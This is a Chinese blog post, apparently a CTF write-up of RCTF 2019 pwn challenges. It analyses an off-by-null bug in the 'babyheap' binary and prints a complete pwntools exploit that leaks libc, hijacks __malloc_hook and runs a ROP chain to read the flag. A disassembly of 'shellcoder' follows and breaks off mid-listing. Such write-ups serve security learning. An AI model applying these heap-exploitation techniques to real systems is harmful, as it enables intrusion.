@@ -1,0 +1,882 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: false,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="周末看了下RCTF，做了几个题感觉还行，还是自己太菜了。">
+<meta name="keywords" content="ctf-pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RCTF-部分PWN解">
+<meta property="og:url" content="http://yoursite.com/2019/05/21/RCTF-部分PWN解/index.html">
+<meta property="og:site_name" content="peanuts&#39;blog">
+<meta property="og:description" content="周末看了下RCTF，做了几个题感觉还行，还是自己太菜了。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-05-21T09:46:05.591Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="RCTF-部分PWN解">
+<meta name="twitter:description" content="周末看了下RCTF，做了几个题感觉还行，还是自己太菜了。">
+
+
+
+
+
+  
+  
+  <link rel="canonical" href="http://yoursite.com/2019/05/21/RCTF-部分PWN解/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>RCTF-部分PWN解 | peanuts'blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">peanuts'blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-mylove">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/Mylove/" rel="section"><i class="menu-item-icon fa fa-fw fa-heart"></i> <br>Mylove</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/21/RCTF-部分PWN解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="peanuts">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/touxiang.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="peanuts'blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">RCTF-部分PWN解
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2019-05-21 17:44:03 / Modified: 17:46:05" itemprop="dateCreated datePublished" datetime="2019-05-21T17:44:03+08:00">2019-05-21</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>周末看了下RCTF，做了几个题感觉还行，还是自己太菜了。<br><a id="more"></a></p>
+<h1 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h1><p>这个题感觉可以作为heap 到 stack的一个例题其中的技巧不知道是碰运气还是出题人设计的。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先来看静态分析的代码</p>
+<h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p>没有去符号果然是很友好的babyheap，大概逆向一下其他函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 savedregs; // [rsp+10h] [rbp+0h]</span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    get_int();</span><br><span class="line">    switch ( (unsigned int)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      case 1u:</span><br><span class="line">        add();</span><br><span class="line">        break;</span><br><span class="line">      case 2u:</span><br><span class="line">        edit();</span><br><span class="line">        break;</span><br><span class="line">      case 3u:</span><br><span class="line">        delete();</span><br><span class="line">        break;</span><br><span class="line">      case 4u:</span><br><span class="line">        show();</span><br><span class="line">        break;</span><br><span class="line">      case 5u:</span><br><span class="line">        puts(&quot;See you next time!&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">        return;</span><br><span class="line">      default:</span><br><span class="line">        puts(&quot;Invalid choice!&quot;);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>这里add的时候没有让我们编辑的操作只是能calloc任意大小的堆块，这里不能用正常的calloc的trick了要用到一些比较骚的技巧。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 add()</span><br><span class="line">&#123;</span><br><span class="line">  void **v0; // rbx</span><br><span class="line">  __int64 v2; // [rsp+0h] [rbp-20h]</span><br><span class="line">  int v3; // [rsp+0h] [rbp-20h]</span><br><span class="line">  int v4; // [rsp+4h] [rbp-1Ch]</span><br><span class="line">  unsigned __int64 v5; // [rsp+8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  LODWORD(v2) = 0;</span><br><span class="line">  while ( *(ptrs + 2 * v2) &amp;&amp; v2 &lt;= 15 )</span><br><span class="line">    LODWORD(v2) = v2 + 1;</span><br><span class="line">  if ( v2 == 16 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;You can&apos;t&quot;);</span><br><span class="line">    exit(-1);</span><br><span class="line">  &#125;</span><br><span class="line">  printf(&quot;Size: &quot;, v2);</span><br><span class="line">  v4 = get_int();</span><br><span class="line">  if ( v4 &lt;= 0 || v4 &gt; 0x1000 )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid size :(&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    *(ptrs + 4 * v3 + 2) = v4;</span><br><span class="line">    v0 = (ptrs + 16 * v3);</span><br><span class="line">    *v0 = calloc(v4, 1uLL);</span><br><span class="line">    puts(&quot;Add success :)&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p><code>*(*(ptrs + 2 * v0) + v1) = 0;</code>这个地方存在一个offbynull的漏洞，大概思路就确定肯定是overlap然后进一步控制malloc_hook。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ST00_4</span><br><span class="line">  int v1; // ST04_4</span><br><span class="line">  __int64 v3; // [rsp+0h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v4; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Index: &quot;);</span><br><span class="line">  LODWORD(v3) = get_int();</span><br><span class="line">  if ( v3 &gt;= 0 &amp;&amp; v3 &lt;= 15 &amp;&amp; *(ptrs + 2 * v3) )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(&quot;Content: &quot;, v3);</span><br><span class="line">    v1 = read_n(*(ptrs + 2 * v0), *(ptrs + 4 * v0 + 2));</span><br><span class="line">    *(*(ptrs + 2 * v0) + v1) = 0;</span><br><span class="line">    puts(&quot;Edit success :)&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid index :(&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v4;</span><br></pre></td></tr></table></figure>
+<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>这个地方没有什么漏洞，写的很好的。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Index: &quot;);</span><br><span class="line">  v1 = get_int();</span><br><span class="line">  if ( v1 &gt;= 0 &amp;&amp; v1 &lt;= 15 &amp;&amp; *(ptrs + 2 * v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*(ptrs + 2 * v1));</span><br><span class="line">    *(ptrs + 2 * v1) = 0LL;</span><br><span class="line">    *(ptrs + 4 * v1 + 2) = 0;</span><br><span class="line">    puts(&quot;Delete success :)&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Invalid index :(&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br></pre></td></tr></table></figure>
+<h4 id="show"><a href="#show" class="headerlink" title="show"></a>show</h4><p>这个地方一个比较坑的地方就是采用的puts输入。。所以如果是overlap一个unsortedbin，然后free他再打印的时候会因为是0截断没有办法打印所以这里就要用trick了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 show()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  printf(&quot;Index: &quot;);</span><br><span class="line">  v1 = get_int();</span><br><span class="line">  if ( v1 &gt;= 0 &amp;&amp; v1 &lt;= 15 &amp;&amp; *(ptrs + 2 * v1) )</span><br><span class="line">    puts(*(ptrs + 2 * v1));</span><br><span class="line">  else</span><br><span class="line">    puts(&quot;Invalid index :(&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><ol>
+<li>先构造overlap吧，只有overlap了才能说后面的操作，这里我overlap了两个heap一个unsortedbin一个fastbin为后续操作做准备。</li>
+<li>接着准备leak，leak的思路是让calloc的清空操作失效，这里通过改chunk的size位可以绕过，具体原因还不详（问的一个大佬@ch4rl3）</li>
+<li>因为ban了fork(),execve()所以没有办法getshell了，只能曲线救国，在malloc_hook写入能返回stack的gadgets然后进一步控制栈去执行rop-&gt;open-&gt;read-&gt;write</li>
+</ol>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = process(&quot;./babyheap&quot;)</span><br><span class="line">elf = ELF(&quot;./babyheap&quot;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">gdb.attach(p)</span><br><span class="line">cmd = lambda c:p.sendlineafter(&quot;Choice: \n&quot; ,str(c))</span><br><span class="line">def add(size):</span><br><span class="line">	cmd(1)</span><br><span class="line">	p.sendlineafter(&quot;Size: &quot; , str(size))</span><br><span class="line"></span><br><span class="line">def edit(index , content):</span><br><span class="line">	cmd(2)</span><br><span class="line">	p.sendlineafter(&quot;Index: &quot; , str(index))</span><br><span class="line">	p.sendafter(&quot;Content: &quot; , content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">	cmd(3)</span><br><span class="line">	p.sendlineafter(&quot;Index: &quot; , str(index))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">	cmd(4)</span><br><span class="line">	p.sendlineafter(&quot;Index: &quot; , str(index))</span><br><span class="line"></span><br><span class="line">add(0x18) # 0  # 0x00</span><br><span class="line">add(0x320) # 1 # 0x20</span><br><span class="line">add(0x18) # 2 # 0x340</span><br><span class="line">add(0x18) # 3 # 0x360</span><br><span class="line"></span><br><span class="line">edit(1 , &quot;a&quot; * 0x2f0  + p64(0x300))</span><br><span class="line">delete(1)</span><br><span class="line">edit(0 , &quot;a&quot; * 0x18)</span><br><span class="line"></span><br><span class="line">add(0x18) #  1</span><br><span class="line">add(0x80) # unsorted bin leak  # 4</span><br><span class="line">add(0x18) # 5</span><br><span class="line">add(0x60) # fastbin attack # 6</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line">delete(2)</span><br><span class="line">add(0x348) # shrin result calloc # 1</span><br><span class="line"># memset</span><br><span class="line">payload = &quot;a&quot; * 0x18</span><br><span class="line">payload += p64(0x91) + &quot;a&quot; * 0x80</span><br><span class="line">payload += p64(0x90) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x71) + &quot;a&quot; * 0x60</span><br><span class="line">payload += p64(0x60) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x21) + &quot;a&quot; * 0x10 </span><br><span class="line"></span><br><span class="line">print(hex(len(payload)))</span><br><span class="line">edit(1 , payload)</span><br><span class="line">delete(6)</span><br><span class="line"></span><br><span class="line">payload = &quot;a&quot; * 0x18</span><br><span class="line">payload += p64(0x91) + &quot;a&quot; * 0x80</span><br><span class="line">payload += p64(0x90) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x72)[:7]</span><br><span class="line">edit(1 , payload)</span><br><span class="line">add(0x60)</span><br><span class="line">show(2)</span><br><span class="line">libc.address = u64(p.recvuntil(&quot;\x7f&quot;).ljust(8 , &quot;\x00&quot;)) - 0x58 - 0x3c4b20</span><br><span class="line">print(hex(libc.address))</span><br><span class="line">malloc_hook = libc.sym[&quot;__malloc_hook&quot;] - 0x23</span><br><span class="line">print hex(malloc_hook)</span><br><span class="line">payload = &quot;a&quot; * 0x18</span><br><span class="line">payload += p64(0x91) + &quot;a&quot; * 0x80</span><br><span class="line">payload += p64(0x90) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x71) + &quot;a&quot; * 0x60</span><br><span class="line">payload += p64(0x60) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x21) + &quot;a&quot; * 0x10 </span><br><span class="line">edit(1,payload)</span><br><span class="line">delete(2)</span><br><span class="line">#------------------</span><br><span class="line">fast_max = libc.address + 3958776</span><br><span class="line">payload = &quot;a&quot; * 0x18</span><br><span class="line">payload += p64(0x91) + &quot;a&quot; * 0x80</span><br><span class="line">payload += p64(0x90) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x71)</span><br><span class="line">payload += p64(libc.address+0x58+0x3c4b20)+p64(fast_max-0x10)+&quot;a&quot;*0x50</span><br><span class="line">payload += p64(0x60) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x21) + &quot;a&quot; * 0x10 </span><br><span class="line"></span><br><span class="line">edit(1,payload)</span><br><span class="line">add(0x60)</span><br><span class="line">payload = &quot;a&quot; * 0x18</span><br><span class="line">payload += p64(0x91) + &quot;a&quot; * 0x80</span><br><span class="line">payload += p64(0x90) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x71) + &quot;a&quot; * 0x60</span><br><span class="line">payload += p64(0x60) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x21) + &quot;a&quot; * 0x10 </span><br><span class="line">edit(1,payload)</span><br><span class="line">delete(2)</span><br><span class="line">payload = &quot;a&quot; * 0x18</span><br><span class="line">payload += p64(0x91) + &quot;a&quot; * 0x80</span><br><span class="line">payload += p64(0x90) + p64(0x21) + &quot;a&quot; * 0x10</span><br><span class="line">payload += p64(0x20) + p64(0x71)</span><br><span class="line">payload += p64(malloc_hook)</span><br><span class="line">edit(1,payload)</span><br><span class="line">add(0x60) #2</span><br><span class="line">add(0x60)</span><br><span class="line">edit(6,&apos;flag&apos;.ljust(19,&apos;\0&apos;)+p64(libc.address+0xAA383))</span><br><span class="line">leng=0x20</span><br><span class="line">add(leng)</span><br><span class="line">libca=libc.address</span><br><span class="line">reada=p64(0xF7250+libca)</span><br><span class="line">writea=p64(0xF72B0+libca)</span><br><span class="line">edit(7,p64(0x200)+p64(libca+0x1b92)+p64(0x200)+reada)</span><br><span class="line">opena=p64(libca+0xF7030)</span><br><span class="line">exita=p64(libca+0x3A030)</span><br><span class="line">p_rdi_r=p64(libca+0x21102)</span><br><span class="line">p_rsi_r=p64(libca+0x1150CA)</span><br><span class="line">p_rdx_r=p64(libca+0x1b92)</span><br><span class="line">m_rdi_rax_r=p64(libca+0x8F42B)</span><br><span class="line">payload=&apos;8&apos;*0x20+p_rdi_r+p64(malloc_hook+0x10)+p_rdi_r+p64(malloc_hook+0x10)+p_rsi_r+p64(0)+opena+p_rdi_r+p64(3)+p_rsi_r+p64(malloc_hook)+p_rdx_r+p64(0x20)+reada+p_rdi_r+p64(1)+writea+exita</span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="shellcoder"><a href="#shellcoder" class="headerlink" title="shellcoder"></a>shellcoder</h1><p>题目考点类似于护网以及某次铁人三项的题目，太真实的考的真的是各种shellcode的编写。</p>
+<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>这里就拿汇编来分析了因为反编译出来基本看不出什么东西</p>
+<h4 id="main-1"><a href="#main-1" class="headerlink" title="main"></a>main</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">sub_340：</span><br><span class="line">.text:0000000000000340                 push    rbx</span><br><span class="line">.text:0000000000000341                 mov     edi, 3Ch ; &apos;&lt;&apos;</span><br><span class="line">.text:0000000000000346                 call    sub_3C0</span><br><span class="line">.text:000000000000034B                 lea     rsi, aHelloShellcode ; &quot;hello shellcoder:&quot;</span><br><span class="line">.text:0000000000000352                 mov     edx, 11h</span><br><span class="line">.text:0000000000000357                 mov     edi, 1</span><br><span class="line">.text:000000000000035C                 call    sub_400</span><br><span class="line">.text:0000000000000361                 xor     r9d, r9d</span><br><span class="line">.text:0000000000000364                 mov     r8d, 0FFFFFFFFh</span><br><span class="line">.text:000000000000036A                 mov     ecx, 22h ; &apos;&quot;&apos;</span><br><span class="line">.text:000000000000036F                 mov     edx, 7</span><br><span class="line">.text:0000000000000374                 mov     esi, 1000h</span><br><span class="line">.text:0000000000000379                 xor     edi, edi</span><br><span class="line">.text:000000000000037B                 call    sub_420</span><br><span class="line">.text:0000000000000380                 mov     rbx, rax</span><br><span class="line">.text:0000000000000383                 mov     rax, 0F4F4F4F4F4F4F4F4h</span><br><span class="line">.text:000000000000038D                 mov     edx, 7</span><br><span class="line">.text:0000000000000392                 mov     rsi, rbx</span><br><span class="line">.text:0000000000000395                 mov     [rbx], rax</span><br><span class="line">.text:0000000000000398                 mov     [rbx+8], rax</span><br><span class="line">.text:000000000000039C                 mov     [rbx+10h], rax</span><br><span 